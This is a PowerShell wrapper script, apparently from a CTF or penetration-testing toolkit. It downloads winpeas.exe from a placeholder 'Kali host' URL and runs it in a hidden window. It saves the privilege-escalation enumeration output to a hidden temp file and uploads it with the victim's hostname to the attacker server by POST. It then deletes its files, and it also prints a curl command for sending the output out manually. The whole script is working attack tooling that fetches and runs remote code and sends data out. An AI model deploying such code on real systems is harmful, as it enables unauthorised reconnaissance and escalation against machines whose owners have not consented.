# ParsingPeas Wrapper Script (PowerShell)
# Runs winpeas and automatically sends output to Kali host
# NOTE: Downloads scripts from Kali host (for isolated CTF environments)
# Compatible with PowerShell 2.0+ and non-interactive shells

# Server URL will be replaced by receiver.py
$ServerUrl = "KALI_SERVER_URL"

$ErrorActionPreference = "Stop"

# Detect if running in interactive console
$IsInteractive = $true
try {
    $ConsoleHost = [Console]::WindowHeight
    if ($ConsoleHost -eq 0) { $IsInteractive = $false }
} catch {
    $IsInteractive = $false
}

# Output function that works in both interactive and non-interactive shells
function Write-Output-Safe {
    param([string]$Message)
    if ($IsInteractive) {
        Write-Host $Message
    } else {
        Write-Output $Message
    }
}

function Write-Output-Color {
    param([string]$Message, [string]$Color = "White")
    if ($IsInteractive) {
        Write-Host $Message -ForegroundColor $Color
    } else {
        Write-Output $Message
    }
}

$SessionId = "scan_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$PID"
$Hostname = $env:COMPUTERNAME
if (-not $Hostname) { $Hostname = "unknown" }
$TmpOutput = "$env:TEMP\.winpeas_$(Get-Date -Format 'yyyyMMdd_HHmmss').tmp"

Write-Output-Color "[*] ParsingPeas - Automated Privilege Escalation Scanner" "Cyan"
Write-Output-Color "[*] Session ID: $SessionId" "Cyan"
Write-Output-Color "[*] Hostname: $Hostname" "Cyan"
Write-Output-Color "[*] Server: $ServerUrl" "Cyan"
Write-Output-Safe ""

$ScanType = "winpeas"
Write-Output-Color "[*] Detected: Windows system" "Yellow"
$ScriptEndpoint = "$ServerUrl/get-winpeas"
$ScriptPath = "$env:TEMP\winpeas.exe"

Write-Output-Color "[*] Downloading $ScanType from Kali host..." "Yellow"

# Download script from Kali host using WebClient (PowerShell 2.0+ compatible)
try {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile($ScriptEndpoint, $ScriptPath)
    $WebClient.Dispose()
} catch {
    Write-Output-Color "[!] Download failed: $_" "Red"
    exit 1
}

if (-not (Test-Path $ScriptPath) -or (Get-Item $ScriptPath).Length -eq 0) {
    Write-Output-Color "[!] Error: Script download failed or empty" "Red"
    exit 1
}

Write-Output-Color "[+] Downloaded successfully" "Green"

Write-Output-Color "[*] Running winpeas (this may take 2-5 minutes)..." "Yellow"
Write-Output-Color "[*] Output is being saved to file..." "Yellow"
Write-Output-Safe ""

# Create empty temp file
[System.IO.File]::WriteAllText($TmpOutput, "")

# Run winpeas and capture output with real-time file size tracking
try {
    $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName = $ScriptPath
    $ProcessInfo.RedirectStandardOutput = $true
    $ProcessInfo.RedirectStandardError = $true
    $ProcessInfo.UseShellExecute = $false
    $ProcessInfo.CreateNoWindow = $true
    
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo = $ProcessInfo
    
    $Process.Start() | Out-Null
    Write-Output-Color "[*] Winpeas running (PID: $($Process.Id))..." "Yellow"
    
    # Start async reading and write to file in real-time
    $OutputBuilder = New-Object System.Text.StringBuilder
    $ErrorBuilder = New-Object System.Text.StringBuilder
    
    $OutputEventHandler = {
        if ($EventArgs.Data -ne $null) {
            $Line = $EventArgs.Data
            [void]$Event.MessageData.AppendLine($Line)
            # Write to file in real-time
            try {
                [System.IO.File]::AppendAllText($using:TmpOutput, $Line + "`n")
            } catch {
                # Ignore write errors
            }
        }
    }
    
    $OutputEvent = Register-ObjectEvent -InputObject $Process `
        -EventName OutputDataReceived `
        -Action $OutputEventHandler `
        -MessageData $OutputBuilder
    
    $ErrorEvent = Register-ObjectEvent -InputObject $Process `
        -EventName ErrorDataReceived `
        -Action $OutputEventHandler `
        -MessageData $ErrorBuilder
    
    $Process.BeginOutputReadLine()
    $Process.BeginErrorReadLine()
    
    # Show progress while winpeas is running
    $StartTime = Get-Date
    $LastUpdate = $StartTime
    $LastSize = 0
    
    while (-not $Process.HasExited) {
        $Now = Get-Date
        $Elapsed = [Math]::Round(($Now - $StartTime).TotalSeconds)
        
        # Get current file size
        $CurrentSize = 0
        if (Test-Path $TmpOutput) {
            $CurrentSize = (Get-Item $TmpOutput).Length
        }
        $CurrentKB = [Math]::Round($CurrentSize / 1KB, 1)
        
        # Non-interactive mode: periodic text updates
        if (-not $IsInteractive) {
            if (($Now - $LastUpdate).TotalSeconds -ge 10 -or $CurrentSize -ne $LastSize) {
                Write-Output "[*] Running... $Elapsed sec | Output: $CurrentKB KB"
                $LastUpdate = $Now
                $LastSize = $CurrentSize
            }
        } else {
            # Interactive mode: fancy display
            $Minutes = [Math]::Floor($Elapsed / 60)
            $Seconds = $Elapsed % 60
            Write-Host "`r[*] Running: $Minutes`:$($Seconds.ToString('00')) | Output: $CurrentKB KB" -NoNewline -ForegroundColor Cyan
        }
        
        Start-Sleep -Milliseconds 500
    }
    
    $Process.WaitForExit()
    $ExitCode = $Process.ExitCode
    
    # Get final size
    $FinalSize = 0
    if (Test-Path $TmpOutput) {
        $FinalSize = (Get-Item $TmpOutput).Length
    }
    $FinalKB = [Math]::Round($FinalSize / 1KB, 1)
    
    # Cleanup events
    Unregister-Event -SourceIdentifier $OutputEvent.Name
    Unregister-Event -SourceIdentifier $ErrorEvent.Name
    Remove-Job -Id $OutputEvent.Id -Force
    Remove-Job -Id $ErrorEvent.Id -Force
    
    if ($IsInteractive) {
        Write-Host "`r[+] Complete! | Output: $FinalKB KB" -NoNewline -ForegroundColor Green
    }
    Write-Output-Safe ""
    Write-Output-Safe ""
    
    # Combine output and errors
    $Output = $OutputBuilder.ToString()
    $ErrorOutput = $ErrorBuilder.ToString()
    
    $FullOutput = $Output
    if ($ErrorOutput) {
        $FullOutput += "`n`n=== STDERR ===`n" + $ErrorOutput
    }
    
    # Save to temp file (overwrite with complete output)
    [System.IO.File]::WriteAllText($TmpOutput, $FullOutput)
    
    Write-Output-Color "[+] Winpeas completed with exit code: $ExitCode" "Green"
    
} catch {
    Write-Output-Color "[!] Error running winpeas: $_" "Red"
    Write-Output-Color "[!] Exception: $($_.Exception.Message)" "Red"
    exit 1
}

# Check if output was generated
if (-not (Test-Path $TmpOutput) -or (Get-Item $TmpOutput).Length -eq 0) {
    Write-Output-Color "[!] Error: No output generated" "Red"
    exit 1
}

$OutputSize = (Get-Item $TmpOutput).Length
Write-Output-Color "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" "Green"

# Calculate MD5 checksum for verification
Write-Output-Safe ""
Write-Output-Color "[*] Calculating checksum..." "Yellow"
try {
    $MD5 = New-Object System.Security.Cryptography.MD5CryptoServiceProvider
    $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
    $Hash = $MD5.ComputeHash($FileBytes)
    $Checksum = [BitConverter]::ToString($Hash).Replace("-", "").ToLower()
    Write-Output-Color "[+] MD5 Checksum: $Checksum" "Green"
} catch {
    Write-Output-Color "[!] Warning: Could not calculate checksum" "Yellow"
    $Checksum = "unknown"
}

Write-Output-Safe ""
Write-Output-Color "[*] Output saved, preparing upload..." "Yellow"
Write-Output-Safe ""

# Test connection before upload
Write-Output-Color "[*] Testing connection to Kali host..." "Yellow"
try {
    $TestClient = New-Object System.Net.WebClient
    $TestResponse = $TestClient.DownloadString("$ServerUrl/health")
    $TestClient.Dispose()
    Write-Output-Color "[+] Connection test successful" "Green"
} catch {
    Write-Output-Color "[!] Warning: Cannot reach server at $ServerUrl" "Yellow"
    Write-Output-Color "[*] Will attempt upload anyway..." "Yellow"
}

Write-Output-Color "[*] Transferring to Kali host..." "Yellow"
Write-Output-Color "[*] Upload endpoint: $ServerUrl/upload" "Cyan"
Write-Output-Color "[*] File to upload: $([Math]::Round($OutputSize / 1KB, 2)) KB" "Cyan"
Write-Output-Safe ""

# Send to Kali with retry logic
$MaxRetries = 3
$RetryCount = 0
$Success = $false

while ($RetryCount -lt $MaxRetries -and -not $Success) {
    Write-Output-Color "[*] Upload attempt $($RetryCount + 1)/$MaxRetries" "Yellow"
    
    try {
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("X-Session-ID", $SessionId)
        $WebClient.Headers.Add("X-Hostname", $Hostname)
        $WebClient.Headers.Add("X-Scan-Type", $ScanType)
        $WebClient.Headers.Add("X-Client-Checksum", $Checksum)
        $WebClient.Headers.Add("Content-Type", "text/plain")
        
        Write-Output-Color "[*] Reading file bytes..." "Cyan"
        $FileBytes = [System.IO.File]::ReadAllBytes($TmpOutput)
        Write-Output-Color "[+] Read $($FileBytes.Length) bytes" "Green"
        
        Write-Output-Color "[*] Uploading to $ServerUrl/upload ..." "Cyan"
        
        $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
        $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
        
        Write-Output-Color "[+] Upload complete!" "Green"
        Write-Output-Color "[+] Transfer successful!" "Green"
        
        # Try to extract report URL and checksum from response
        try {
            if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
                $ReportUrl = $matches[1]
                Write-Output-Color "[+] View report at: $ServerUrl$ReportUrl" "Green"
            }
            if ($ResponseText -match '"checksum"\s*:\s*"([^"]+)"') {
                $ServerChecksum = $matches[1]
                if ($ServerChecksum -eq $Checksum) {
                    Write-Output-Color "[+] Checksum verified: Match!" "Green"
                } else {
                    Write-Output-Color "[!] Checksum mismatch! Client: $Checksum | Server: $ServerChecksum" "Red"
                }
            }
        } catch {
            # Ignore parse errors
        }
        
        $WebClient.Dispose()
        $Success = $true
        
    } catch {
        $RetryCount++
        Write-Output-Color "[!] Transfer failed" "Red"
        Write-Output-Color "[!] Error: $_" "Red"
        Write-Output-Color "[!] Exception: $($_.Exception.Message)" "Red"
        if ($_.Exception.InnerException) {
            Write-Output-Color "[!] Inner Exception: $($_.Exception.InnerException.Message)" "Red"
        }
        
        if ($RetryCount -lt $MaxRetries) {
            Write-Output-Color "[*] Retrying in 2 seconds..." "Yellow"
            Start-Sleep -Seconds 2
        }
    }
}

Write-Output-Safe ""
if ($Success) {
    Write-Output-Color "[+] Cleaning up..." "Green"
    Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $TmpOutput -Force -ErrorAction SilentlyContinue
    Write-Output-Color "[+] Done!" "Green"
    exit 0
} else {
    Write-Output-Color "[!] Transfer failed after $MaxRetries attempts" "Red"
    Write-Output-Color "[*] Output saved locally at: $TmpOutput" "Yellow"
    Write-Output-Color "[*] MD5 Checksum: $Checksum" "Yellow"
    Write-Output-Color "[*] You can manually upload with curl:" "Yellow"
    Write-Output-Color "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' -H 'X-Client-Checksum: $Checksum' $ServerUrl/upload" "Yellow"
    exit 1
}
